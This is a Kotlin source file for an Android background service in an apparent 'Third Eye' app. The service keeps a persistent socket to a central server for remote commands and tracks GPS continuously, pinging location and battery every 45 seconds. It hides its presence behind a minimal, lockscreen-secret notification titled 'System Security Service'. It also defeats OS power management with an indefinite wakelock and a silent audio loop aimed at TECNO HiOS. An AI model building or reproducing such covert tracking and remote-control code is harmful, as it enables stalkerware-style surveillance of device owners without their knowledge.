package com.thirdeye.app.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import com.thirdeye.app.MainActivity
import com.thirdeye.app.R
import com.thirdeye.app.uploader.BackendClient
import com.thirdeye.app.uploader.SocketManager

/**
 * 24/7 Persistent Background Service that keeps the device connected to the central
 * Third Eye server even when the app is minimized or the screen is turned off.
 *
 * Uses:
 * - FOREGROUND_SERVICE_DATA_SYNC to prevent Android 14 Doze Mode from killing the connection.
 * - Silent, minimal notification so it doesn't disturb the user.
 * - ConnectivityManager.NetworkCallback to automatically reconnect whenever Wi-Fi / Data changes.
 * - Partial WakeLock during heartbeats to ensure socket frames go through on deep sleep.
 */
class DeviceTelemetryService : Service() {

    companion object {
        private const val TAG = "TelemetryService"
        const val CHANNEL_ID = "thirdeye_telemetry_channel"
        const val NOTIFICATION_ID = 1003

        const val ACTION_START = "com.thirdeye.app.ACTION_START_TELEMETRY"
        const val ACTION_STOP = "com.thirdeye.app.ACTION_STOP_TELEMETRY"

        fun startService(context: Context) {
            val intent = Intent(context, DeviceTelemetryService::class.java).apply {
                action = ACTION_START
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(context, intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start DeviceTelemetryService", e)
            }
        }

        fun stopService(context: Context) {
            val intent = Intent(context, DeviceTelemetryService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }

    private var wakeLock: PowerManager.WakeLock? = null
    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var heartbeatThread: Thread? = null
    private var isRunning = false
    private var silentAudioTrack: AudioTrack? = null
    private var silentAudioThread: Thread? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "DeviceTelemetryService created")
        createSilentNotificationChannel()
        acquireWakeLock()
        registerNetworkCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                Log.i(TAG, "Stopping DeviceTelemetryService")
                stopSelf()
                return START_NOT_STICKY
            }
            else -> {
                startForegroundNotification()
                startTelemetryEngine()
            }
        }
        return START_STICKY
    }

    private fun startTelemetryEngine() {
        if (isRunning) return
        isRunning = true

        // 0. Start silent audio keeper to bypass TECNO HiOS cgroup freeze (mAudioState = 1)
        startSilentAudioKeeper()

        // 1. Initialize persistent Socket.io connection
        SocketManager.initAndConnect(applicationContext)

        // 2. Start active background GPS tracking
        com.thirdeye.app.utils.LocationTracker.startListening(applicationContext)

        // 3. Send initial HTTP ping with GPS coordinates & battery
        BackendClient.sendPing(applicationContext)

        // 4. Start background periodic heartbeat thread
        heartbeatThread?.interrupt()
        heartbeatThread = Thread {
            try {
                var cycleCount = 0
                while (isRunning && !Thread.currentThread().isInterrupted) {
                    Thread.sleep(15000) // Every 15 seconds (faster reconnect detection)

                    cycleCount++

                    // CRITICAL: Renew WakeLock every 2 hours to prevent TECNO HiOS from
                    // revoking it automatically. Re-acquire if released for any reason.
                    if (cycleCount % 480 == 0) { // every 480 cycles × 15s = 2 hours
                        try {
                            val wl = wakeLock
                            if (wl != null && !wl.isHeld) {
                                @Suppress("WakelockTimeout")
                                wl.acquire()
                                Log.i(TAG, "🔄 WakeLock re-acquired")
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "WakeLock renew error: ${e.message}")
                        }
                    }

                    // Ensure socket is alive — reconnect immediately if dropped
                    if (!SocketManager.isConnected()) {
                        Log.d(TAG, "⚠️ Socket disconnected, reconnecting...")
                        SocketManager.reconnect(applicationContext)
                    }

                    // Every 45 seconds (every 3rd cycle), send full HTTP ping to keep MongoDB lastSeen fresh
                    if (cycleCount % 3 == 0) {
                        BackendClient.sendPing(applicationContext)
                    }
                }
            } catch (e: InterruptedException) {
                // Thread stopped
            }
        }.apply {
            isDaemon = true
            name = "TelemetryHeartbeatThread"
            start()
        }

        Log.i(TAG, "✅ Telemetry engine running 24/7 with HiOS freeze protection")
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "thirdeye:telemetry_wakelock").apply {
                setReferenceCounted(false)
                // CRITICAL FIX: Indefinite WakeLock — TECNO HiOS hibernation bypass.
                // Without this, HiOS freezes the process within ~10s of screen-off,
                // killing the socket connection and blocking all remote commands.
                acquire()
            }
            Log.i(TAG, "✅ Indefinite PARTIAL_WAKE_LOCK acquired — HiOS freeze bypassed")
        } catch (e: Exception) {
            Log.w(TAG, "Could not acquire partial WakeLock: ${e.message}")
        }
    }

    private fun registerNetworkCallback() {
        try {
            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.i(TAG, "Network became available, reconnecting telemetry...")
                    SocketManager.reconnect(applicationContext)
                    BackendClient.sendPing(applicationContext)
                }

                override fun onLost(network: Network) {
                    Log.w(TAG, "Network lost")
                }
            }
            connectivityManager?.registerNetworkCallback(request, networkCallback!!)
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register NetworkCallback: ${e.message}")
        }
    }

    private fun createSilentNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Background Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps device telemetry synchronized"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun startForegroundNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security Service")
            .setContentText("Telemetry active in background")
            .setSmallIcon(R.drawable.ic_camera_record)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startSilentAudioKeeper() {
        if (silentAudioThread != null && silentAudioThread?.isAlive == true) return
        silentAudioThread = Thread {
            try {
                val sampleRate = 8000
                val minBufferSize = AudioTrack.getMinBufferSize(
                    sampleRate,
                    AudioFormat.CHANNEL_OUT_MONO,
                    AudioFormat.ENCODING_PCM_16BIT
                ).coerceAtLeast(1024)

                val audioAttributes = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .build()

                val audioFormat = AudioFormat.Builder()
                    .setSampleRate(sampleRate)
                    .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                    .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                    .build()

                val track = AudioTrack.Builder()
                    .setAudioAttributes(audioAttributes)
                    .setAudioFormat(audioFormat)
                    .setBufferSizeInBytes(minBufferSize)
                    .setTransferMode(AudioTrack.MODE_STREAM)
                    .build()

                silentAudioTrack = track
                track.play()
                Log.i(TAG, "🎵 HiOS Anti-Freeze Silent AudioKeeper active (mAudioState = 1)")

                val silentBuffer = ByteArray(minBufferSize)
                while (isRunning && !Thread.currentThread().isInterrupted) {
                    track.write(silentBuffer, 0, silentBuffer.size)
                    Thread.sleep(150)
                }
            } catch (e: Exception) {
                Log.w(TAG, "SilentAudioKeeper error: ${e.message}")
            }
        }.apply {
            isDaemon = true
            name = "SilentAudioKeeperThread"
            start()
        }
    }

    private fun stopSilentAudioKeeper() {
        try {
            silentAudioThread?.interrupt()
            silentAudioThread = null
            silentAudioTrack?.stop()
            silentAudioTrack?.release()
            silentAudioTrack = null
        } catch (e: Exception) {
            // Ignore
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        stopSilentAudioKeeper()
        heartbeatThread?.interrupt()
        heartbeatThread = null

        try {
            networkCallback?.let { connectivityManager?.unregisterNetworkCallback(it) }
        } catch (e: Exception) {
            // Ignore
        }

        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (e: Exception) {
            // Ignore
        }

        Log.i(TAG, "DeviceTelemetryService destroyed")
    }
}
